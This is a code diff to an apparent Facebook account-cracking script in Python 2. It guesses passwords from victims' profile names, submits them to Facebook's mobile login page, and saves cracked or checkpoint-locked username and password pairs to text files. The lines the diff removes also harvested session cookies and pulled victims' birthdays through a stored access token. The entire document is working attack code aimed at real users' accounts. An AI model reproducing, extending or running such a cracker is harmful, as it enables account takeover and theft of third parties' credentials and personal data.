@@ -91,37 +91,15 @@ class __crack__:
             p = ses.get("https://mbasic.facebook.com")
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
-            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
-                wrt = '%s|%s|%s' % (user,pw,kuki)
+                wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('ok.txt','a').write('%s\n' % wrt)
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                try:
-                    kontol = open('login.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
-                    month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('cp.txt','a').write('%s\n' % wrt)
-                    open('checkcp.txt', 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day   = ''
-                    year  = ''
-                except:
-                    pass
-
-                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('cp.txt', 'a').write('%s\n' % wrt)
-                open('checkcp.txt', 'a').write('%s\n' % wrt)
                 break
                 continue
 
@@ -135,8 +113,8 @@ class __crack__:
                 try:
                     uid, name = omen.split('<=>')
                     xz = name.split(' ')
-                    if len(xz) == 3 or len(xz) == 4:
-                        pwx = [name, xz[0]+"123", x+"1234", x+"12345"]
+                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                        pwx = [name]
                     else:
                         pwx = [name, x+"123"]
                     __nemoXD__.submit(self.__api__, uid, pwx)
